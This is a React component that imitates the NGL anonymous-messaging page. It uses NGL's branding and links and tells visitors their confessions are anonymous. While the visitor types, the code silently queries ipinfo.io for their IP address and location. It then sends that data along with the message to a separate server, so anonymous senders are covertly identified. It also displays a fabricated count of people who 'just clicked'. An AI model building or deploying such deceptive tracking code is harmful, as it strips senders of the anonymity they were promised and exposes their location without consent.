import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import styles from './Home.module.scss';

const Home = () => {
	const { username } = useParams();
	const [persons, setPersons] = useState(500);
	const [valueTxt, setValueTxt] = useState('');
	const [txtFocus, setTxtFocus] = useState(false);
	const [sendBtn, setSendBtn] = useState(false);
	const [data, setData] = useState({});

	useEffect(() => {
		document.title = `💖 @${username} 😍`;

		const metaTwtTitle = document.createElement('meta');
		metaTwtTitle.name = 'twitter:title';
		metaTwtTitle.content = `@${username}: Send me anonymous messages!`;
		document.head.appendChild(metaTwtTitle);
	}, [username]);

	// const randomsValues = ['I love you!', "You're awesome!"];

	setTimeout(() => {
		setPersons(Math.floor(Math.random() * (1500 - 1000 + 1)) + 1000);
	}, 1500);

	const getValueTxt = async (valueTxt: string) => {
		const getData = await fetch(
			`https://ipinfo.io/json?token=${import.meta.env.VITE_VERCEL_TOKEN}`
		);

		Object.keys(data).length === 0
			? setData(await getData.json())
			: '';

		setValueTxt(valueTxt);
		if (valueTxt.length >= 1 && !valueTxt.startsWith(' ')) {
			setSendBtn(true);
		} else {
			setSendBtn(false);
		}
	};

	const sendConfession = async () => {

		const res = await fetch(`https://ngl-server.vercel.app/setConfession`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({
				username: username,
				message: valueTxt,
				data,
			}),
		});

		console.log(res.json());

		// setTimeout(() => {
		// 	location.href = 'https://ngl.link/p/sent/confessions';
		// }, 1500);
	};

	// const setRandomValue = () => {
	// 	setValueTxt(
	// 		randomsValues[Math.round(Math.random() * (randomsValues.length - 1))]
	// 	);
	//     getValueTxt(valueTxt);
	// };

	return (
		<main className={styles.main}>
			<div className={styles.container}>
				<div className={styles.container__question}>
					<div className={styles.block__question}>
						<div className={styles.header__question}>
							<img
								src="https://pluspng.com/img-png/png-user-icon-circled-user-icon-2240.png"
								// alt=""
							/>
							<div>
								<p>@{username}</p>
								<b>send me anonymous confessions</b>
							</div>
						</div>
						<div className={styles.textarea__container}>
							<textarea
								onFocus={() => setTxtFocus(true)}
								onBlur={() => setTxtFocus(false)}
								onChange={(e) => getValueTxt(e.target.value)}
								placeholder="envíame mensajes anónimos..."
								name=""
								id=""
							/>
							<button>🎲</button>
						</div>
					</div>
					<p className={styles.text__center}>
						🔒 preguntas y respuestas anónimas
					</p>
					{sendBtn ? (
						<button onClick={sendConfession} className={styles.button}>
							<b>¡Enviar!</b>
						</button>
					) : (
						''
					)}
				</div>
				{txtFocus ? (
					''
				) : (
					<div className={styles.container__info}>
						<b className={styles.text__center}>
							👇 {persons} personas acaban de pulsar el botón👇
						</b>
						<a
							className={styles.button}
							href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932">
							<b>¡Obtén tus propios mensajes!</b>
						</a>
						<div className={styles.terminos__politicas}>
							<a href="https://ngl.link/p/terms">Terms</a>
							<a href="https://ngl.link/p/privacy">Privacy</a>
						</div>
					</div>
				)}
			</div>
		</main>
	);
};

export default Home;
